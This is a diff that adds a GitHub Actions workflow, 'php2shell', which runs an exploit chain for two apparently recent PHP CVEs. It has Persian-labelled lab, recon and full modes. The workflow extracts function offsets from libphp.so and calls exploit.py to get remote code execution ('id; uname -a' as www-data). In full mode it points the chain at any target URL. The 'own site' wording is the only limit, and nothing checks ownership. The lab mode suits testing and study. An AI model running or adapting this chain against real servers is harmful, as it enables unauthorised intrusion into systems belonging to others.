@@ -1,0 +1,124 @@
+name: php2shell — CVE-2026-109618/109619 chain
+
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: "lab = اثبات زنجیره روی lab محلی | recon = تشخیص بی‌خطر سایت | full = زنجیره کامل روی سایت (نیازمند آفست بیلد)"
+        required: true
+        default: "lab"
+        type: choice
+        options: [lab, recon, full]
+      target:
+        description: "آدرس هدف برای recon/full (مثال: https://example.com/index.php)"
+        required: false
+        default: ""
+      target_offsets_env:
+        description: "محتوای offsets.env بیلد هدف (برای full) — خالی = فقط lab-محور"
+        required: false
+        default: ""
+      retries:
+        description: "تعداد retry زنجیره"
+        required: false
+        default: "3"
+      dbg:
+        description: "باز کردن SSH دیباگ (tmate) در صورت شکست"
+        required: false
+        default: "false"
+        type: boolean
+
+concurrency:
+  group: php2shell-${{ github.ref }}
+  cancel-in-progress: true
+
+permissions: {}
+
+jobs:
+  chain:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Guard — full mode requires target + offsets
+        if: inputs.mode == 'full'
+        run: |
+          [ -n "${{ inputs.target }}" ] || { echo "::error::target خالی است"; exit 1; }
+          [ -n "${{ inputs.target_offsets_env }}" ] || { echo "::error::برای full آفست بیلد هدف لازم است (بخوان docs: nm -D libphp.so)"; exit 1; }
+
+      # ---------- LAB: اثبات زنجیره روی ایمیج کنترل‌شده ----------
+      - name: Lab — start vulnerable target (php:8.4.26-apache, single prefork worker)
+        if: inputs.mode == 'lab'
+        run: |
+          chmod +x lab.sh
+          ./lab.sh
+          mkdir -p out
+
+      - name: Lab — extract offsets from target's own libphp.so
+        if: inputs.mode == 'lab'
+        run: |
+          python3 -c "
+          from lib.offsets import extract_from_container, save_offsets_env
+          z, d = extract_from_container('php2shell-target')
+          save_offsets_env('out/offsets.env', z, d)
+          print(f'zif_system=0x{z:x} zval_ptr_dtor=0x{d:x}')
+          "
+
+      - name: Lab — recon (precondition check)
+        if: inputs.mode == 'lab'
+        run: python3 exploit.py -t http://127.0.0.1:18110/index.php --recon-only --output json | tee out/recon.json
+
+      - name: Lab — run full chain (RCE proof: uid=www-data)
+        if: inputs.mode == 'lab'
+        run: |
+          python3 exploit.py -t http://127.0.0.1:18110/index.php \
+            --cmd "id; uname -a" \
+            --offsets-env out/offsets.env \
+            --restart php2shell-target \
+            --retries ${{ inputs.retries }} \
+            --out-dir out
+
+      - name: Lab — verify proof
+        if: inputs.mode == 'lab'
+        run: |
+          grep -q "uid=" out/.p2s_result 2>/dev/null \
+            && echo "PROOF: $(cat out/.p2s_result)" \
+            || { echo "::error::proof یافت نشد — زنجیره به B2 نرسیده"; exit 1; }
+
+      # ---------- RECON: تشخیص بی‌خطر روی سایت خودت ----------
+      - name: Recon — passive check on own site
+        if: inputs.mode == 'recon'
+        run: |
+          [ -n "${{ inputs.target }}" ] || { echo "::error::target خالی است"; exit 1; }
+          python3 exploit.py -t "${{ inputs.target }}" --recon-only --output json | tee recon.json
+          echo "--- نتیجه ---"
+          cat recon.json
+
+      # ---------- FULL: زنجیره کامل روی سایت خودت ----------
+      - name: Full — load target offsets
+        if: inputs.mode == 'full'
+        run: printf '%s\n' "${{ inputs.target_offsets_env }}" > target-offsets.env
+
+      - name: Full — run chain against own site
+        if: inputs.mode == 'full'
+        run: |
+          python3 exploit.py -t "${{ inputs.target }}" \
+            --cmd "id" \
+            --offsets-env target-offsets.env \
+            --retries ${{ inputs.retries }} \
+            --out-dir out || echo "::warning::زنجیره در این run به proof نرسید — لاگ را بررسی کن (A1/B1/A2/B2)"
+
+      # ---------- اشتراکی: نگهداری شواهد ----------
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: php2shell-${{ inputs.mode }}-${{ github.run_id }}
+          path: |
+            out/
+            recon.json
+          retention-days: 1
+
+      - name: Debug SSH on failure
+        if: failure() && inputs.dbg
+        uses: mxschmitt/action-tmate@v3
